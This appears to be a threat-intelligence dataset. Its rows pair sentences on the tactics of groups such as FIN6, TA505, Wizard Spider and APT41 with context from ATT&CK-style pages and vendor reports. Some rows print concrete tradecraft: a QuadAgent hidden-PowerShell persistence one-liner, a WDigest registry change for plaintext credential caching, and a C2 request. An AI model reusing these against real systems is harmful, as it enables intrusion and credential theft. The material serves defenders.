threat group-3390 actors look for and use vpn profiles during an operation to access the network using external vpn services.,[5]enterpriset1068exploitation for privilege escalationthreat group-3390has used cve-2014-6324 and cve-2017-0213 to escalate privileges. [2][11]enterpriset1210exploitation of remote servicesthreat group-3390has exploited ms17-010 to move laterally to other systems on the network.,[9]enterpriset1133external remote servicesthreat group-3390actors look for and use vpn profiles during an operation to access the network using external vpn services.,[1]threat group-3390has also obtained owa account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network. [2]enterpriset1574.001hijack execution flow:dll search order hijackingthreat group-3390has performed dll search order hijacking to execute their payload.,66f577f83063d294857009b2,2644,0.7370365449850876
"ta505 has used a wide variety of ransomware, such as locky, jaff, bart, philadelphia, and globeimposter, to encrypt victim files and demand a ransom payment.",[1][2][8][6].007command and scripting interpreter:javascriptta505has used javascript for code execution. [1][2]enterpriset1555.003credentials from password stores:credentials from web browsersta505has used malware to gather credentials from internet explorer.,"[1]enterpriset1486data encrypted for impactta505has used a wide variety of ransomware, such asclop, locky, jaff, bart, philadelphia, and globeimposter, to encrypt victim files and demand a ransom payment.",[1]enterpriset1140deobfuscate/decode files or informationta505has decrypted packed dlls with an xor key. [4]enterpriset1568.001dynamic resolution:fast flux dnsta505has used fast flux to mask botnets by distributing payloads across multiple ips.,66f579983063d29485700a7e,4099,0.8108305739376599
ta505 has used fast flux to mask botnets by distributing payloads across multiple ips.,"[1]enterpriset1486data encrypted for impactta505has used a wide variety of ransomware, such asclop, locky, jaff, bart, philadelphia, and globeimposter, to encrypt victim files and demand a ransom payment. [1]enterpriset1140deobfuscate/decode files or informationta505has decrypted packed dlls with an xor key.",[4]enterpriset1568.001dynamic resolution:fast flux dnsta505has used fast flux to mask botnets by distributing payloads across multiple ips.,[8]enterpriset1562.001impair defenses:disable or modify toolsta505has used malware to disable windows defender. [5]enterpriset1105ingress tool transferta505has downloaded additional malware to execute on victim systems.,66f579983063d29485700a7e,4101,0.758558040492302
ta505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives.,"[1]enterpriset1204.001user execution:malicious linkta505has used lures to get users to click links in emails and attachments. for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files.",[1][2][3][10][9][12][8][13].002user execution:malicious fileta505has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives.,"for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files. [1][2][3][10][9][12][8][13][6]enterpriset1078.002valid accounts:domain accountsta505has used stolen domain admin accounts to compromise additional hosts.",66f579983063d29485700a7e,4125,0.7116499991656768
"for example, ta505 makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files.",[10][11]enterpriset1552.001unsecured credentials:credentials in filesta505has used malware to gather credentials from ftp clients and outlook. [1]enterpriset1204.001user execution:malicious linkta505has used lures to get users to click links in emails and attachments.,"for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files.","[1][2][3][10][9][12][8][13].002user execution:malicious fileta505has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files.",66f579983063d29485700a7e,4124,0.7819678263583946
"for example, ta505 makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files.","for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files. [1][2][3][10][9][12][8][13].002user execution:malicious fileta505has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives.","for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files.",[1][2][3][10][9][12][8][13][6]enterpriset1078.002valid accounts:domain accountsta505has used stolen domain admin accounts to compromise additional hosts. [6],66f579983063d29485700a7e,4126,0.7819678263583946
ta505 has used fast flux to mask botnets by distributing payloads across multiple ips.,"[1]enterpriset1486data encrypted for impactta505has used a wide variety of ransomware, such asclop, locky, jaff, bart, philadelphia, and globeimposter, to encrypt victim files and demand a ransom payment. [1]enterpriset1140deobfuscate/decode files or informationta505has decrypted packed dlls with an xor key.",[4]enterpriset1568.001dynamic resolution:fast flux dnsta505has used fast flux to mask botnets by distributing payloads across multiple ips.,[8]enterpriset1562.001impair defenses:disable or modify toolsta505has used malware to disable windows defender. [5]enterpriset1105ingress tool transferta505has downloaded additional malware to execute on victim systems.,66f579983063d29485700a7e,4101,0.758558040492302
ta505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives.,"[1]enterpriset1204.001user execution:malicious linkta505has used lures to get users to click links in emails and attachments. for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files.",[1][2][3][10][9][12][8][13].002user execution:malicious fileta505has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives.,"for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files. [1][2][3][10][9][12][8][13][6]enterpriset1078.002valid accounts:domain accountsta505has used stolen domain admin accounts to compromise additional hosts.",66f579983063d29485700a7e,4125,0.7116499991656768
it has also used common document file names for other malware binaries.,"[7]enterpriset1570lateral tool transferwizard spiderhas used stolen credentials to copy tools into the%temp%directory of domain controllers. [6]enterpriset1036.004masquerading:masquerade task or servicewizard spiderhas used scheduled tasks to installtrickbot, using task names to appear legitimate such as windotnet, googletask, or sysnetsf.",[6]it has also used common document file names for other malware binaries.,"[4]enterpriset1112modify registrywizard spiderhas modified the registry keyhklm\\\\system\\\\currentcontrolset\\\\control\\\\securityproviders\\\\wdigestby setting theuselogoncredentialregistry value to1in order to force credentials to be stored in clear text in memory.wizard spiderhas also modified the wdigest registry key to allow plaintext credentials to be cached in memory. [6][7]enterpriset1135network share discoverywizard spiderhas used the ""net view"" command to locate mapped network shares.",66f579d13063d29485700aa5,148,1.0000000000000002
it has also used powershell to execute commands and move laterally through a victim network.,[2][4].004boot or logon autostart execution:winlogon helper dllwizard spiderhas established persistence using userinit by adding the registry key hklm\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon. [4]enterpriset1059.001command and scripting interpreter:powershellwizard spiderhas used macros to execute powershell scripts to download malware on victim's machines.,[6]it has also used powershell to execute commands and move laterally through a victim network.,[2][4][12][7].003command and scripting interpreter:windows command shellwizard spiderhas usedcmd.exeto execute commands on a victim's machine. [11][7]enterpriset1136.001create account:local accountwizard spiderhas created local administrator accounts to maintain persistence in compromised networks.,66f579d13063d29485700aa5,126,1.0000000000000002
"wizard spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.","[2]enterpriset1018remote system discoverywizard spiderhas used networkdll for network discovery and psfin specifically for financial and point of sale indicators.wizard spiderhas also usedadfind,nltest/dclist, and powershell script get-datainfo.ps1 to enumerate domain computers, including the domain controller. [5][6][4][12][11][7]enterpriset1053.005scheduled task/job:scheduled taskwizard spiderhas used scheduled tasks to establish persistence fortrickbotand other malware.","[6][2][4][13][7]enterpriset1489service stopwizard spiderhas used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.",[11]enterpriset1518software discoverywizard spiderhas utilized the powershell scriptget-datainfo.ps1to collect installed backup software information from a compromised machine. [7].001security software discoverywizard spiderhas used wmi to identify anti-virus products installed on a victim's machine.,66f579d13063d29485700aa5,167,0.7407318101024934
wizard spider has sent phishing emails containing a link to an actor-controlled google drive document or other free online file hosting services.,"[4].003os credential dumping:ntdswizard spiderhas gained access to credentials via exported copies of the ntds.dit active directory database.wizard spiderhas also created a volume shadow copy and used a batch script file to collect ntds.dit with the use of the windows utility, ntdsutil. [4][7]enterpriset1566.001phishing:spearphishing attachmentwizard spiderhas used spearphishing attachments to deliver microsoft documents containing macros or pdfs containing malicious links to download eitheremotet, bokbot,trickbot, orbazar.",[6][12][7].002phishing:spearphishing linkwizard spiderhas sent phishing emails containing a link to an actor-controlled google drive document or other free online file hosting services.,"[2][13]enterpriset1055process injectionwizard spiderhas used process injection to execute payloads to escalate privileges. [7].001dynamic-link library injectionwizard spiderhas injected malicious dlls into memory with read, write, and execute permissions.",66f579d13063d29485700aa5,158,0.7416434383476351
it has also used common document file names for other malware binaries.,"[7]enterpriset1570lateral tool transferwizard spiderhas used stolen credentials to copy tools into the%temp%directory of domain controllers. [6]enterpriset1036.004masquerading:masquerade task or servicewizard spiderhas used scheduled tasks to installtrickbot, using task names to appear legitimate such as windotnet, googletask, or sysnetsf.",[6]it has also used common document file names for other malware binaries.,"[4]enterpriset1112modify registrywizard spiderhas modified the registry keyhklm\\\\system\\\\currentcontrolset\\\\control\\\\securityproviders\\\\wdigestby setting theuselogoncredentialregistry value to1in order to force credentials to be stored in clear text in memory.wizard spiderhas also modified the wdigest registry key to allow plaintext credentials to be cached in memory. [6][7]enterpriset1135network share discoverywizard spiderhas used the ""net view"" command to locate mapped network shares.",66f579d13063d29485700aa5,148,1.0000000000000002
it has also used powershell to execute commands and move laterally through a victim network.,[2][4].004boot or logon autostart execution:winlogon helper dllwizard spiderhas established persistence using userinit by adding the registry key hklm\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon. [4]enterpriset1059.001command and scripting interpreter:powershellwizard spiderhas used macros to execute powershell scripts to download malware on victim's machines.,[6]it has also used powershell to execute commands and move laterally through a victim network.,[2][4][12][7].003command and scripting interpreter:windows command shellwizard spiderhas usedcmd.exeto execute commands on a victim's machine. [11][7]enterpriset1136.001create account:local accountwizard spiderhas created local administrator accounts to maintain persistence in compromised networks.,66f579d13063d29485700aa5,126,1.0000000000000002
registry entries in hklm\\software\\\\wow6432node\\\\\\microsoft\\windows nt\\currentversion\\winlogon\\ and hkcu\\software\\microsoft\\windows nt\\currentversion\\winlogon\\ are used to manage additional helper programs and functionalities that support winlogon.,"it also removed the functionality of double-clicking to auto-mount isos.disable browser password saving via group policy (gpo), set the following policies below then close the group policy management editor:- disable saving browser history: enabled- enable autofill: disabled- enable saving password to the password manager: disabled- default cookies setting: enabled: keep cookies for the duration of the session- enable saving password to the password manager: disabledalways deploy the highest level of protection on your firewall and endpoints. in particular:- ensure the firewall has tls 1.3 inspection, next-gen ips, and streaming dpi with machine learning and sandboxing for protection from the latest threats.- ensure endpoints have modern next-gen protection capabilities to guard against downloading malicious files from untrusted sources.detectionswhen some of the above-mentioned protections and mitigations cannot be implemented, the detection ideas below could help to identify potential threats early on.monitor new file creations with double extension ending with executable file extensions (.exe, .vbs, .bat and etc.",).monitor modification and creation of windows registry keys and sub-keys under winlogon registry locations (hklm\\\\software[\\\\wow6432node\\\\]\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon\\\\ and hkcu\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon\\\\).,"establishing a baseline for the values of often abused registry key locations could also improve detection accuracy.establish command line baselines for command line commands of common executables, such as powershell, cmd, and other lolbins (including msbuild), to identify potential malicious usage of the built-in tools.mitre att&cktactic: techniqueatt&ck codeexecution: user execution malicious filet1204execution: powershellt1059.001defenseevasion:deobfuscate/decode files or informationt1140defenseevasion: masquerading double file extensiont1036.007defenseevasion: trusted developer utilities proxy executionmsbuildt1127.001defenseevasion: html smugglingt1027.006defenseevasion: dll side-loadingt1574.002command and control:  bidirectional communicationt1102.002initial access:spearphishingattachmentt1566.001persistence:winlogonhelper dllt1547.004credential access: credentials from web browserst1555.003hunting resources:yara rulesabout eclecticiq intelligence & research teameclecticiq is a global provider of threat intelligence, hunting, and response technology and services. headquartered in amsterdam, theeclecticiq intelligence & research teamis made up of experts from europe and the u.s. with decades of experience in cyber security and intelligence in industry and government.we would love to hear from you.",66f57a8e3063d29485700b0b,2021,0.7651828279197798
quadagent modifies an hkcu registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting c2 communications.,"to create the scheduled task, the powershell payload starts by writing the following to a vbscript file with the same name as the task name  (ex.office365dcomcheck.vbsorsystemdiskclean.vbs) within the%temp%folder:createobject(""wscript.shell"").run""""&wscript.arguments(0)&"""",0,falsethe scheduled task will then run every five minutes, which provides persistent execution of the downloader script. the task itself is fairly simple, calling the vbscript file which contains a powershell one-liner as an argument to run the quadagent payload (ex.office365dcomcheck.ps1andsystemdiskclean.ps1):wscript.exe""office365dcomcheck.vbs""\\\\""powershell.exe-executionpolicybypass-windowstylehidden-noprofile'<current powershell script>'\\\\""after setting up persistent access, the payload checks to see if a value exists within a registry key in thehkcuhive whose name is the same as the scheduled task (ex.","office365dcomcheck or systemdiskclean), such as the following:hkcu\\\\office365dcomcheckthe payload uses this registry key to store a session identifier unique to the compromised system, as well as a pre-shared key used for encrypting and decrypting communications between the system and the c2 server.","this registry key is empty upon the first execution of the payload. the payload will communicate with its c2 server to obtain the session id and pre-shared key and write it to this registry key in the following format:<session id>_<pre-shared key>to obtain the session id and pre-shared key, the payload will first try to contact the c2 via an https get request to the following url:hxxps://www.rdppath[.",66f57b5f3063d29485700b82,1931,0.7281746036473512
fin6 has used has used metasploit’s named-pipe impersonation technique to escalate privileges.,"today this malware shows unwanted ads, tomorrow it could steal sensitive information; from private messages to banking credentials and much more.the “agent smith” campaign serves as a sharp reminder that effort from system developers alone is not enough to build a secure android eco-system. it requires attention and action from system developers, device manufacturers, app developers, and users, so that vulnerability fixes are patched, distributed, adopted and installed in time.it is also another example for why organizations and consumers alike should have an advanced mobile threat prevention solution installed on the device to protect themselves against the possibility of unknowingly installing malicious apps, even from trusted app stores.for more information about how to keep your device protected, check outsand blast mobile.",enterpriset1134access token manipulationfin6has used has used metasploit’s named-pipe impersonation technique to escalate privileges.,"[2]enterpriset1087.002account discovery:domain accountfin6has used metasploit’spsexecntdsgrab module to obtain a copy of the victim's active directory database. [1]enterpriset1560archive collected datafollowing data collection,fin6has compressed log files into a zip archive prior to staging and exfiltration.",66f57cd43063d29485700c42,4307,0.7243974002950362
"fin6 has encoded data gathered from the victim with a simple substitution cipher and single-byte xor using the 0xaa key, and base64 with character permutation.","[2]enterpriset1087.002account discovery:domain accountfin6has used metasploit’spsexecntdsgrab module to obtain a copy of the victim's active directory database. [1]enterpriset1560archive collected datafollowing data collection,fin6has compressed log files into a zip archive prior to staging and exfiltration.","[1].003archive via custom methodfin6has encoded data gathered from the victim with a simple substitution cipher and single-byte xor using the 0xaa key, and base64 with character permutation.","[1][7]enterpriset1119automated collectionfin6has used a script to iterate through a list of compromised pos systems, copy and remove data to a log file, and to bind to events from the submit payment button. [1][7]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderfin6has used registry run keys to establish persistence for its downloader tools known as hardtack and shipbread.",66f57cd43063d29485700c42,4310,0.8369794753599546
fin6 used the plink command-line utility to create ssh tunnels to c2 servers.,[1][2]enterpriset1566.001phishing:spearphishing attachmentfin6has targeted victims with e-mails containing malicious attachments. [8].003phishing:spearphishing via servicefin6has used fake job advertisements sent via linkedin to spearphish targets.,[4]enterpriset1572protocol tunnelingfin6used the plink command-line utility to create ssh tunnels to c2 servers.,"[1]enterpriset1021.001remote services:remote desktop protocolfin6used rdp to move laterally in victim networks. [1][2]enterpriset1018remote system discoveryfin6used publicly available tools (including microsoft's built-in sql querying tool, osql.exe) to map the internal network and conduct reconnaissance against active directory, structured query language (sql) servers, and netbios.",66f57cd43063d29485700c42,4338,0.7335333274261124
"fin6 has used a script to iterate through a list of compromised pos systems, copy and remove data to a log file, and to bind to events from the submit payment button.","[1]enterpriset1560archive collected datafollowing data collection,fin6has compressed log files into a zip archive prior to staging and exfiltration. [1].003archive via custom methodfin6has encoded data gathered from the victim with a simple substitution cipher and single-byte xor using the 0xaa key, and base64 with character permutation.","[1][7]enterpriset1119automated collectionfin6has used a script to iterate through a list of compromised pos systems, copy and remove data to a log file, and to bind to events from the submit payment button.",[1][7]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderfin6has used registry run keys to establish persistence for its downloader tools known as hardtack and shipbread. [1]enterpriset1110.002brute force:password crackingfin6has extracted password hashes from ntds.dit to crack offline.,66f57cd43063d29485700c42,4311,0.8651913467438096
"fin6 has used scripting to iterate through a list of compromised pos systems, copy data to a log file, and remove the original data files.",[1][7]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderfin6has used registry run keys to establish persistence for its downloader tools known as hardtack and shipbread. [1]enterpriset1110.002brute force:password crackingfin6has extracted password hashes from ntds.dit to crack offline.,"[1]enterpriset1059command and scripting interpreterfin6has used scripting to iterate through a list of compromised pos systems, copy data to a log file, and remove the original data files.","[1][2].001powershellfin6has used powershell to gain access to merchant's networks, and a metasploit powershell module to download and execute shellcode and to set up a local listener. [1][2][8].003windows command shellfin6has usedkill.batscript to disable security tools.",66f57cd43063d29485700c42,4314,0.8085753682083398
fin6 has used the stealer one credential stealer to target e-mail and file transfer utilities including ftp.,[1][2][8].003windows command shellfin6has usedkill.batscript to disable security tools. [2].007javascriptfin6has used malicious javascript to steal payment card data from e-commerce sites.,[7]enterpriset1555credentials from password storesfin6has used the stealer one credential stealer to target e-mail and file transfer utilities including ftp.,[8].003credentials from web browsersfin6has used the stealer one credential stealer to target web browsers. [8]enterpriset1213data from information repositoriesfin6has collected schemas and user accounts from systems running sql server.,66f57cd43063d29485700c42,4318,0.7839295928340632
fin6 has used the stealer one credential stealer to target web browsers.,[2].007javascriptfin6has used malicious javascript to steal payment card data from e-commerce sites. [7]enterpriset1555credentials from password storesfin6has used the stealer one credential stealer to target e-mail and file transfer utilities including ftp.,[8].003credentials from web browsersfin6has used the stealer one credential stealer to target web browsers.,[8]enterpriset1213data from information repositoriesfin6has collected schemas and user accounts from systems running sql server. [8]enterpriset1005data from local systemfin6has collected and exfiltrated payment card data from compromised systems.,66f57cd43063d29485700c42,4319,0.745828233250655
"the tools targeted cve-2013-3660, cve-2011-2005, and cve-2010-4398, all of which could allow local users to access kernel-level privileges.",[1]enterpriset1048.003exfiltration over alternative protocol:exfiltration over unencrypted non-c2 protocolfin6has sent stolen payment card data to remote servers via http posts. [7]enterpriset1068exploitation for privilege escalationfin6has used tools to exploit windows vulnerabilities in order to escalate privileges.,"the tools targeted cve-2013-3660, cve-2011-2005, and cve-2010-4398, all of which could allow local users to access kernel-level privileges.",[1]enterpriset1562.001impair defenses:disable or modify toolsfin6has deployed a utility script namedkill.batto disable anti-virus. [2]enterpriset1070.004indicator removal:file deletionfin6has removed files from victim machines.,66f57cd43063d29485700c42,4326,1.0000000000000002
fin6 has used malicious javascript to steal payment card data from e-commerce sites.,"[1][2].001powershellfin6has used powershell to gain access to merchant's networks, and a metasploit powershell module to download and execute shellcode and to set up a local listener. [1][2][8].003windows command shellfin6has usedkill.batscript to disable security tools.",[2].007javascriptfin6has used malicious javascript to steal payment card data from e-commerce sites.,[7]enterpriset1555credentials from password storesfin6has used the stealer one credential stealer to target e-mail and file transfer utilities including ftp. [8].003credentials from web browsersfin6has used the stealer one credential stealer to target web browsers.,66f57cd43063d29485700c42,4317,0.8105204050231672
"fin6 has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate windows service.",[1]enterpriset1562.001impair defenses:disable or modify toolsfin6has deployed a utility script namedkill.batto disable anti-virus. [2]enterpriset1070.004indicator removal:file deletionfin6has removed files from victim machines.,"[1]enterpriset1036.004masquerading:masquerade task or servicefin6has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate windows service.","[2]enterpriset1046network service discoveryfin6used publicly available tools (including microsoft's built-in sql querying tool, osql.exe) to map the internal network and conduct reconnaissance against active directory, structured query language (sql) servers, and netbios. [1]enterpriset1095non-application layer protocolfin6has used metasploit bind and reverse tcp stagers.",66f57cd43063d29485700c42,4329,0.7129614313743845
machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57cac3063d29485700c2b,2677,0.7074855274059076
machete employed some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57cac3063d29485700c2b,2677,0.7857802503334574
"fin6 has used powershell to gain access to merchant's networks, and a metasploit powershell module to download and execute shellcode and to set up a local listener.","[1]enterpriset1110.002brute force:password crackingfin6has extracted password hashes from ntds.dit to crack offline. [1]enterpriset1059command and scripting interpreterfin6has used scripting to iterate through a list of compromised pos systems, copy data to a log file, and remove the original data files.","[1][2].001powershellfin6has used powershell to gain access to merchant's networks, and a metasploit powershell module to download and execute shellcode and to set up a local listener.",[1][2][8].003windows command shellfin6has usedkill.batscript to disable security tools. [2].007javascriptfin6has used malicious javascript to steal payment card data from e-commerce sites.,66f57cd43063d29485700c42,4315,0.8963183400216717
fin6 has used fake job advertisements sent via linkedin to spearphish targets.,[1][2].003os credential dumping:ntdsfin6has used metasploit’spsexecntdsgrab module to obtain a copy of the victim's active directory database. [1][2]enterpriset1566.001phishing:spearphishing attachmentfin6has targeted victims with e-mails containing malicious attachments.,[8].003phishing:spearphishing via servicefin6has used fake job advertisements sent via linkedin to spearphish targets.,[4]enterpriset1572protocol tunnelingfin6used the plink command-line utility to create ssh tunnels to c2 servers. [1]enterpriset1021.001remote services:remote desktop protocolfin6used rdp to move laterally in victim networks.,66f57cd43063d29485700c42,4337,0.7490993886764684
"to move laterally on a victim network, fin6 has used credentials stolen from various systems on which it gathered usernames and password hashes.",[4]enterpriset1569.002system services:service executionfin6has created windows services to execute encoded powershell commands. [2]enterpriset1204.002user execution:malicious filefin6has used malicious documents to lure victims into allowing execution of powershell scripts.,"[8]enterpriset1078valid accountsto move laterally on a victim network,fin6has used credentials stolen from various systems on which it gathered usernames and password hashes.",[1][2][8]enterpriset1102web servicefin6has used pastebin and google storage to host content for their operations. [2]enterpriset1047windows management instrumentationfin6has used wmi to automate the remote execution of powershell scripts.,66f57cd43063d29485700c42,4345,0.7366954099667927
"the tools targeted cve-2013-3660, cve-2011-2005, and cve-2010-4398, all of which could allow local users to access kernel-level privileges.",[1]enterpriset1048.003exfiltration over alternative protocol:exfiltration over unencrypted non-c2 protocolfin6has sent stolen payment card data to remote servers via http posts. [7]enterpriset1068exploitation for privilege escalationfin6has used tools to exploit windows vulnerabilities in order to escalate privileges.,"the tools targeted cve-2013-3660, cve-2011-2005, and cve-2010-4398, all of which could allow local users to access kernel-level privileges.",[1]enterpriset1562.001impair defenses:disable or modify toolsfin6has deployed a utility script namedkill.batto disable anti-virus. [2]enterpriset1070.004indicator removal:file deletionfin6has removed files from victim machines.,66f57cd43063d29485700c42,4326,1.0000000000000002
"fin6 has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate windows service.",[1]enterpriset1562.001impair defenses:disable or modify toolsfin6has deployed a utility script namedkill.batto disable anti-virus. [2]enterpriset1070.004indicator removal:file deletionfin6has removed files from victim machines.,"[1]enterpriset1036.004masquerading:masquerade task or servicefin6has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate windows service.","[2]enterpriset1046network service discoveryfin6used publicly available tools (including microsoft's built-in sql querying tool, osql.exe) to map the internal network and conduct reconnaissance against active directory, structured query language (sql) servers, and netbios. [1]enterpriset1095non-application layer protocolfin6has used metasploit bind and reverse tcp stagers.",66f57cd43063d29485700c42,4329,0.7129614313743845
machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57cac3063d29485700c2b,2677,0.7074855274059076
fin6 has used fake job advertisements sent via linkedin to spearphish targets.,[1][2].003os credential dumping:ntdsfin6has used metasploit’spsexecntdsgrab module to obtain a copy of the victim's active directory database. [1][2]enterpriset1566.001phishing:spearphishing attachmentfin6has targeted victims with e-mails containing malicious attachments.,[8].003phishing:spearphishing via servicefin6has used fake job advertisements sent via linkedin to spearphish targets.,[4]enterpriset1572protocol tunnelingfin6used the plink command-line utility to create ssh tunnels to c2 servers. [1]enterpriset1021.001remote services:remote desktop protocolfin6used rdp to move laterally in victim networks.,66f57cd43063d29485700c42,4337,0.7490993886764684
apt41 deployed master boot record bootkits on windows systems to hide their malware and maintain persistence on victim systems.,[6]enterpriset1069permission groups discoveryapt41usednet groupcommands to enumerate various windows user groups and permissions. [6]enterpriset1566.001phishing:spearphishing attachmentapt41sent spearphishing emails with attachments such as compiled html (.chm) files to initially compromise their victims.,[1]enterpriset1542.003pre-os boot:bootkitapt41deployed master boot record bootkits on windows systems to hide their malware and maintain persistence on victim systems.,[1]enterpriset1055process injectionapt41malware tidyelf loaded the main winterlove component by injecting it into the iexplore.exe process. [1]enterpriset1090proxyapt41used a tool called classfon to covertly proxy network communications.,66f57dc63063d29485700ce4,4886,0.7197727465637611
apt41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.,"[5]enterpriset1596.005search open technical databases:scan databasesapt41uses the chinese website fofa.su, similar to the shodan scanning service, for passive scanning of victims. [6]enterpriset1505.003server software component:web shellduringc0017,apt41deployed jscript web shells through the creation of malicious viewstate objects.",[5]enterpriset1553.002subvert trust controls:code signingapt41leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.,"[1][2]enterpriset1195.002supply chain compromise:compromise software supply chainapt41gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users. [1]enterpriset1218.001system binary proxy execution:compiled html fileapt41used compiled html (.chm) files for targeting.",66f57dc63063d29485700ce4,4899,0.7371762679561298
apt41 used a ransomware called encryptor raas to encrypt files on the targeted systems and provide a ransom note to the user.,"[1][2]apt41created the storsyncsvc service to provide persistence for cobalt strike. [7]enterpriset1555.003credentials from password stores:credentials from web browsersapt41used browserghost, a tool designed to obtain credentials from browsers, to retrieve information from password stores.",[6]enterpriset1486data encrypted for impactapt41used a ransomware called encryptor raas to encrypt files on the targeted systems and provide a ransom note to the user.,[1]enterpriset1213.003data from information repositories:code repositoriesapt41cloned victim user git repositories during intrusions. [6]enterpriset1005data from local systemapt41has uploaded files and data from a compromised host.,66f57dc63063d29485700ce4,4830,0.7789226130838616
"apt41 used legitimate websites for c2 through dead drop resolvers , including github, pastebin, and microsoft technet.",[7][2]enterpriset1550.002use alternate authentication material:pass the hashapt41uses tools such asmimikatzto enable lateral movement via captured password hashes. [6]enterpriset1078valid accountsapt41used compromised credentials to log on to other systems.,"[1][3]enterpriset1102.001web service:dead drop resolverapt41used legitimate websites for c2 through dead drop resolvers (ddr), including github, pastebin, and microsoft technet.","[1]duringc0017,apt41used dead drop resolvers on two separate tech community forums for theirkeyplugwindows-version backdoor; notablyapt41updated the community forum posts frequently with new dead drop resolvers during the campaign. [5]enterpriset1047windows management instrumentationapt41used wmi in several ways, including for execution of commands via wmiexec as well as for persistence viapowersploit.",66f57dc63063d29485700ce4,4914,0.7382099643594191
"apt41 exploited cve-2020-10189 against zoho manageengine desktop central, and cve-2019-19781 to compromise citrix application delivery controllers  and gateway devices.","[5]enterpriset1041exfiltration over c2 channelduringc0017,apt41used its cloudflare services c2 channels for data exfiltration. [5]enterpriset1567exfiltration over web serviceduringc0017,apt41used cloudflare services for data exfiltration.","[5]enterpriset1190exploit public-facing applicationapt41exploited cve-2020-10189 against zoho manageengine desktop central through unsafe deserialization, and cve-2019-19781 to compromise citrix application delivery controllers (adc) and gateway devices.","[7]apt41leveraged vulnerabilities such as proxylogon exploitation or sql injection for initial access. [6]duringc0017,apt41exploited cve-2021-44207 in the usaherds application and cve-2021-44228 in log4j, as well as other .net deserialization, sql injection, and directory traversal vulnerabilities to gain initial access.",66f57dc63063d29485700ce4,4844,0.7628845879730504
